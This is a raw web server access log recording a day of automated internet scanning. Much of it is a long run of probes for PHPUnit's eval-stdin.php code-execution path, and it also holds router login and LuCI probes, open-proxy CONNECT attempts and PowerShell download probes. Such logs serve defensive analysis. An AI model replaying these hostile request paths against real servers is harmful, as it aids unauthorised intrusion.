185.93.89.118 - - [16/Feb/2025:08:24:50 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:24:53 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:24:56 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:24:59 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:03 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:06 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:09 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:12 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:15 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:18 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:22 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:25 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:28 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:31 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:34 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:37 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:41 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:44 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:48 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:51 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:54 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:25:57 +0000] "GET /all/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:00 +0000] "GET /advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:03 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:06 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:09 +0000] "GET /back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:12 +0000] "GET /backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:15 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:18 +0000] "GET /beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:21 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:24 +0000] "GET /blog/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:27 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:30 +0000] "GET /config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:33 +0000] "GET /core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:36 +0000] "GET /core/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:39 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:42 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:45 +0000] "GET /dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:48 +0000] "GET /develop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:51 +0000] "GET /ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:54 +0000] "GET /ecc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:26:57 +0000] "GET /git/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:00 +0000] "GET /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:03 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:06 +0000] "GET /laravel_api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:09 +0000] "GET /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:12 +0000] "GET /live/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:15 +0000] "GET /local/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:18 +0000] "GET /modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:21 +0000] "GET /new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:24 +0000] "GET /old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:27 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:30 +0000] "GET /pid/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:34 +0000] "GET /pkm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:37 +0000] "GET /pms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:40 +0000] "GET /portal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:43 +0000] "GET /pos/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:46 +0000] "GET /pos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:49 +0000] "GET /production/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:52 +0000] "GET /production/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:55 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:27:59 +0000] "GET /server/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:28:02 +0000] "GET /site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:28:05 +0000] "GET /workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [16/Feb/2025:08:28:08 +0000] "GET /web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
46.19.143.58 - - [16/Feb/2025:08:39:12 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
175.107.0.60 - - [16/Feb/2025:08:53:57 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 153 "-" "-"
92.246.87.21 - - [16/Feb/2025:08:54:26 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.10 - - [16/Feb/2025:09:02:40 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [16/Feb/2025:09:18:31 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
109.205.213.198 - - [16/Feb/2025:09:33:03 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.121.84.7 - - [16/Feb/2025:09:57:37 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.51 - - [16/Feb/2025:10:11:36 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
206.168.34.125 - - [16/Feb/2025:10:13:19 +0000] "\x00\x0E\x089\x12\xF6\xA4\x98\xA6\xA6\x9B\x00\x00\x00\x00\x00" 400 157 "-" "-"
206.168.34.125 - - [16/Feb/2025:10:13:22 +0000] "\x00\x0E89\x12\xF6\xA4\x98\xA6\xA6\x9B\x00\x00\x00\x00\x00" 400 157 "-" "-"
193.68.89.10 - - [16/Feb/2025:10:45:50 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:10:47:34 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:11:00:24 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
92.246.87.21 - - [16/Feb/2025:11:16:10 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:11:44:20 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
45.120.177.190 - - [16/Feb/2025:11:45:04 +0000] "CONNECT ffmpeg.pro:443 HTTP/1.1" 400 157 "-" "-"
193.68.89.51 - - [16/Feb/2025:12:01:29 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.10 - - [16/Feb/2025:12:26:35 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
65.49.1.120 - - [16/Feb/2025:12:43:20 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
65.49.1.110 - - [16/Feb/2025:12:43:56 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
65.49.1.110 - - [16/Feb/2025:12:44:19 +0000] "GET http://api.ipify.org/?format=json HTTP/1.1" 200 146 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
65.49.1.120 - - [16/Feb/2025:12:44:30 +0000] "CONNECT www.shadowserver.org:443 HTTP/1.1" 400 157 "-" "-"
65.49.1.112 - - [16/Feb/2025:12:44:34 +0000] "GET /geoserver/web/ HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
165.227.127.192 - - [16/Feb/2025:13:50:02 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
165.227.127.192 - - [16/Feb/2025:13:50:02 +0000] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Go-http-client/1.1"
206.189.57.162 - - [16/Feb/2025:14:06:39 +0000] "GET /aaa9 HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
206.189.57.162 - - [16/Feb/2025:14:06:46 +0000] "GET /aab8 HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
206.189.57.162 - - [16/Feb/2025:14:07:06 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 zgrab/0.x"
218.75.38.212 - - [16/Feb/2025:14:14:53 +0000] "GET / HTTP/1.0" 200 135 "-" "-"
115.238.44.234 - - [16/Feb/2025:14:17:00 +0000] "GET / HTTP/1.0" 200 135 "-" "-"
92.246.87.21 - - [16/Feb/2025:14:32:14 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [16/Feb/2025:14:34:23 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
92.246.87.21 - - [16/Feb/2025:15:54:47 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [16/Feb/2025:16:01:47 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.10 - - [16/Feb/2025:16:10:40 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:16:14:09 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
141.255.166.90 - - [16/Feb/2025:16:57:57 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:17:05:46 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
92.246.87.21 - - [16/Feb/2025:17:23:15 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [16/Feb/2025:17:23:47 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [16/Feb/2025:17:46:45 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
20.238.100.89 - - [16/Feb/2025:17:50:10 +0000] "GET / HTTP/1.1" 200 124 "-" "Python/3.11 aiohttp/3.8.4"
193.68.89.10 - - [16/Feb/2025:17:51:36 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:17:51:50 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:18:31:26 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [16/Feb/2025:18:35:25 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
92.246.87.21 - - [16/Feb/2025:18:52:58 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.58 - - [16/Feb/2025:19:13:18 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:19:29:55 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:19:35:25 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
172.105.128.12 - - [16/Feb/2025:19:41:08 +0000] "\x16\x03\x01\x01" 400 157 "-" "-"
172.105.128.12 - - [16/Feb/2025:19:41:08 +0000] "\x16\x03\x01\x01" 400 157 "-" "-"
193.68.89.10 - - [16/Feb/2025:19:42:19 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.189.95 - - [16/Feb/2025:20:08:19 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC47\xBB\x10\x7F\x12\xDE\xAC\x14\xEF7+\xAF\xB4\xD7\xB1|\xEE_0\xFB\x87\xFD\xDF\xBD\x81Y/\xC6$Q\x0F\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
143.110.189.95 - - [16/Feb/2025:20:08:19 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x14\xE8\xACu\xE3V{\xB7\xB7\x83\xF9\xA6)\xBA\xB6r\xE4?|Z\xC2\x11\xEFA\xE5~\xC7\xC67\xB7\x81\x13\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
143.110.189.95 - - [16/Feb/2025:20:08:19 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.189.95 - - [16/Feb/2025:20:08:20 +0000] "GET /download/powershell/ HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
143.110.189.95 - - [16/Feb/2025:20:08:20 +0000] "GET /get.php HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
78.108.177.54 - - [16/Feb/2025:20:15:10 +0000] "GET / HTTP/1.0" 200 135 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)"
92.246.87.21 - - [16/Feb/2025:20:17:13 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [16/Feb/2025:20:18:20 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [16/Feb/2025:20:18:32 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.105.70.190 - - [16/Feb/2025:20:24:19 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
205.210.31.83 - - [16/Feb/2025:20:59:54 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03t\xCB\xECzk(\xC3CKQu\x81\x0BexX\x88\xE0\xD8nl\xAF\xA7\xDE\xDB<\xB6\x9F\xE3\xF1V<\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
